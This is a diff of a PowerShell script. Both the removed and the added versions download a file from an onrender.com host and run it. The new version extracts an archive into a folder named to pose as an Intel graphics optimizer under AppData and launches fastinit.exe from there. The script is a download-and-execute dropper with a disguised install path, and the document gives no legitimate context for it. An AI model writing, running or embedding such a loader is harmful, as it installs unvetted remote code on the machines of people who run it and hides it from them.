@@ -1,19 +1,27 @@
-$Config = @{
-    Url        = "https://fastinit-host.onrender.com/downloader_rs"
-    OutputPath = "$env:TEMP\fastinit_dm.exe"
+function Process-Path {
+    param([string]$Path)
+
+    $Path = [Environment]::ExpandEnvironmentVariables($Path)
+    $dir = Split-Path -Parent $Path
+
+    if ($dir) {
+        New-Item -ItemType Directory -Force -Path $dir | Out-Null
+    }
+
+    return $Path
 }
 
-function Invoke-MyShit {
-    param(
-        [Parameter(Position = 0)][string]$Url = $Config.Url,
-        [Parameter(Position = 1)][string]$OutputPath = $Config.OutputPath
-    )
-    Invoke-WebRequest -Uri $Url -OutFile $OutputPath
-    Start-Process $OutputPath
-}
+$DOWNLOAD_URL = "https://fastinit-host.onrender.com/compressed-fastinit"
 
-function Main {
-    Invoke-MyShit @args
-}
+$ZIPDEST = Process-Path "%TEMP%\fastinit.zip"
+$EXTRACTION_DST = Process-Path "%USERPROFILE%\AppData\Local\IntelGFX\Optimizer"
+$INVOKED_PROC_NAME = "fastinit.exe"
 
-Main @args
+# Download
+Invoke-WebRequest -Uri $DOWNLOAD_URL -OutFile $ZIPDEST
+
+# Extract
+Expand-Archive -Path $ZIPDEST -DestinationPath $EXTRACTION_DST -Force
+
+# Run
+Start-Process -FilePath (Join-Path $EXTRACTION_DST "dst" $INVOKED_PROC_NAME)
